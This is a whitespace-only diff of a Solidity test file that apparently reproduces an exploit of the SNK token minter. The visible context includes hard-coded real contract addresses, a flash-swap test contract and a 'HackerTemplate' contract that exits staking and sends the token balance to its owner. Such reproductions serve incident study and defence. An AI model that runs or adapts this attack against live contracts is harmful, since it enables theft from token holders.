@@ -13,6 +13,7 @@ import "./../interface.sol";
 // parent `rewardPerToken`, but times all children's balance
 
 interface IPancakeRouter01 {
+
     function factory() external pure returns (address);
     function WETH() external pure returns (address);
 
@@ -136,16 +137,20 @@ interface IPancakeRouter01 {
         uint256 amountOut,
         address[] calldata path
     ) external view returns (uint256[] memory amounts);
+
 }
 
 interface ISNKMinter {
+
     function bindParent(address parent) external;
     function stake(uint256 amount) external;
     function getReward() external;
     function exit() external;
+
 }
 
 contract SNKExp is Test, IPancakeCallee {
+
     IERC20 SNKToken = IERC20(0x05e2899179003d7c328de3C224e9dF2827406509);
     ISNKMinter minter = ISNKMinter(0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee);
     IPancakePair pool = IPancakePair(0x7957096Bd7324357172B765C4b0996Bb164ebfd4);
@@ -209,9 +214,11 @@ contract SNKExp is Test, IPancakeCallee {
         }
         SNKToken.transfer(address(pool), 85_000 ether);
     }
+
 }
 
 contract HackerTemplate {
+
     IERC20 SNKToken = IERC20(0x05e2899179003d7c328de3C224e9dF2827406509);
     ISNKMinter minter = ISNKMinter(0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee);
     address public owner;
@@ -244,4 +251,5 @@ contract HackerTemplate {
         minter.exit();
         SNKToken.transfer(owner, SNKToken.balanceOf(address(this)));
     }
+
 }
